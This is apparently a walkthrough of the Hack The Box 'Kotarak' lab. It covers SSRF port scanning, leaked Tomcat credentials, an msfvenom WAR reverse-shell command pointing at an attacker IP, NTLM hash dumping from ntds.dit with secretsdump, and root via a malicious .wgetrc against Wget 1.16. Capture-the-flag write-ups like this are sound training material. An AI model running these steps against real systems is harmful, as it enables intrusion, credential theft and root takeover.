---
title: "Hack The Box - Kotarak"
tags: [linux,hard,ssrf,tomcat,ntds.dit,ntlm,secretsdump,wget,cronjob]
categories: HackTheBox-Linux
---


![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/title.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/title.png)

## *NMAP*
This Machine is the Hard level machine so i will prefer the Full Port Scan :- 

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/nmap.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/nmap.png)


## *Enumerating [ SSRF ]*

-> So on port 8080 we have our Tomcat running . On port 60000 we have an webpage that sends an GET request on the url provided :

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/Untitled%203.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/Untitled%203.png)

-> If we try to read /etc/passwd the The word **`file`** is filtered which stops us from reading local files. Although we are able to use [localhost](http://localhost) and access this and the tomcat page :

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/burp.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/burp.png)

=> Scanning Ports on [localhost](http://localhost) using wfuzz 

**`wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ`**
![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/wfuzz.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/wfuzz.png)

→ [localhost:888](http://localhost:888) has interesting things :

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/back.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/back.png)

→ Taking a look at **backup** option.

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/se.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/se.png)

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/cred.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/cred.png)

We got credentials for tomcat

```
admin : 3@g01PdhB!
```

⇒ Logged in on tomcat manager page. Uploaded a WAR msfvenom shell and popped a shell :

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f war > shell.war
```
![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/tommm.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/tommm.png)

*Starting out netcat 

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/image.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/image.png)

---

### *Privilege Escalation [ tomcat to atanas ]*

⇒ In /home/tomcat/to_archive/pentest_data  folder we find 2 interesting files which looks like one of them is ntds.dit and the other is system registry file
   .dir file contains the details for the ad environment and .bin is registry file  :

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/pwd.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/pwd.png)

Lets run [secretsdump.py](http://secretsdump.py) [ a tool from impacket ] to retrieve ntlm hashes

```bash
impacket-secretsdump -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system  20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin LOCAL
```  

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/hash.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/hash.png)

→ Cracking the NTLM hash

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/crack.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/crack.png)

→ The credentials work and we are able to switch to user atanas : 

**`atanas : f16tomcat!`**

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/su.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/su.png)

### *Privilege Escalation to Root*

⇒ We are able to read and write files in root directory. We find the following :

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/root1.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/root1.png)

→ Looks like there's another   machine on the network with the ip [ 10.0.3.133 ] which is running an wget request  on  http server. We can also see the version of Wget being used  ( Wget/1.16 ). There's an exploit for this version of wget being used

Exploit : [https://www.exploit-db.com/exploits/40064](https://www.exploit-db.com/exploits/40064)

```bash
GNU Wget before 1.18 when supplied with a malicious URL (to a malicious or 
compromised web server) can be tricked into saving an arbitrary remote file 
supplied by an attacker, with arbitrary contents and filename under 
the current directory and possibly other directories by writing to .wgetrc.
Depending on the context in which wget is used, this can lead to remote code 
execution and even root privilege escalation if wget is run via a root cronjob 
as is often the case in many web application deployments.
```

⇒ So in this exploit we will create a 301x redirect , when the user machine  try to access that wget archive  file it will redirected to the  ftp server and that ftp server will be running  on our own attacker machine that will serve a malicious file which will give us root access 

→ Creating malicious .wgetrc File on our Own machine  that we will be serving :

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/root2.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/root2.png)


=> Run pythonftp server on attacker machine , i.e our own machine 

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/python.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/python.png)

First we need to Edit our exploit and then transfer it into our victim machine  Using python http server on attcker  and wget on victim  :

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/root4.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/root4.png)

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/wget.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/wget.png)

=> Start Nc Listener 

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/nc%20lis.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/nc%20lis.png)

=> Runing exploit.py on Victim server but it doesn't allow us to do so. There is authbind on the system which allows a program which does not or should not run as root to bind to low-numbered ports in a controlled way

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/auth%20python.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/auth%20python.png)

=> After Waiting for Few Minutes it will give us a shell ( be patience  it will take time ) 

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/sad.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/sad.png)









